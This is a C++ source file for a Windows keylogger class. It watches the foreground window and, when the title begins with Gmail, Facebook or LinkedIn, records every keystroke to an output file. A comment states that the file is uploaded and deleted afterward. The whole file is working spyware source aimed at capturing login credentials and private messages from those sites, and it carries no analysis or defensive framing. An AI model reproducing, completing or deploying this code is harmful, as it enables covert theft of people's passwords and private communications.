#include "stdafx.h"
#include "Logger.h"

Logger::Logger() {
	initialize();
}


/*
	Build a set of the websites or windows,
	in which you want to log the key strokes of the user.
	insert() must take only the first word of the window title.
*/
void Logger::initialize() {
	interests.insert("Gmail");
	interests.insert("Facebook");
	interests.insert("LinkedIn");
}


/*
	Returns the first word of the foreground window title
*/
char* Logger::getCurrWindowTitle() {
	char title[128];
	do {
		window = GetForegroundWindow();
	} while (!window);
	if (!GetWindowTextA(window, title, sizeof(title)))
		return nullptr;
	return strtok(title, " -");
}


/*
	Returns 1 if the key is a virtual key and inserts its meaning into the output file
	0 otherwise, with no insertion.
*/
int Logger::isSpecial(OutputFile &of, int key) const {
	switch (key) {
	case VK_MENU:
		of.insert("");
		return 1;
	case VK_SHIFT:
		of.insert("[SHIFT]");
		return 1;
	case VK_SPACE:
		of.insert(" ");
		return 1;
	case VK_RETURN:
		of.insert("\n");
		return 1;
	case VK_TAB:
		of.insert("[TAB]");
		return 1;
	case VK_BACK:
		of.insert("[BACKSPACE]");
		return 1;
	case VK_DELETE:
		of.insert("[DELETE]");
		return 1;
	case VK_CAPITAL:
		of.insert("[CAPS LOCK]");
		return 1;
	case VK_HOME:
		of.insert("[HOME]");
		return 1;
	case VK_END:
		of.insert("[END]");
		return 1;
	case VK_LEFT:
		of.insert("[LEFT]");
		return 1;
	case VK_RIGHT:
		of.insert("[RIGHT]");
		return 1;
	case VK_NUMPAD0:
		of.insert("0");
		return 1;
	case VK_NUMPAD1:
		of.insert("1");
		return 1;
	case VK_NUMPAD2:
		of.insert("2");
		return 1;
	case VK_NUMPAD3:
		of.insert("3");
		return 1;
	case VK_NUMPAD4:
		of.insert("4");
		return 1;
	case VK_NUMPAD5:
		of.insert("5");
		return 1;
	case VK_NUMPAD6:
		of.insert("6");
		return 1;
	case VK_NUMPAD7:
		of.insert("7");
		return 1;
	case VK_NUMPAD8:
		of.insert("8");
		return 1;
	case VK_NUMPAD9:
		of.insert("9");
		return 1;
	case VK_ADD:
		of.insert("+");
		return 1;
	case VK_DIVIDE:
		of.insert("/");
		return 1;
	case VK_MULTIPLY:
		of.insert("*");
		return 1;
	case VK_SUBTRACT:
		of.insert("-");
		return 1;
	case 0xBD:
		of.insert("-");
		return 1;
	default:
		return 0;
	}
}

Logger::~Logger() {}


void Logger::start() {
	while (1) {
		char *title = getCurrWindowTitle();
		while (title == nullptr || interests.count(std::string(title)) == 0)		// Proceed only if the current window matches one of the interests
			title = getCurrWindowTitle();

		OutputFile of(title);
		while (getCurrWindowTitle() && strcmp(title, getCurrWindowTitle()) == 0) {
			for (int key = 0; key <= 255; key++) {
				if (GetAsyncKeyState(key) == -32767) {
					if (!isSpecial(of, key)) {
						if (!GetAsyncKeyState(0x10) && (key >= 65 && key <= 90)) {
							char ch = key + 32;
							of.insert(&ch);
						}
						else {
							char ch = key;
							of.insert(&ch);
						}
					}
				}
			}
		}

		//OutputFile is closed, uploaded and deleted in destructor
	}
}
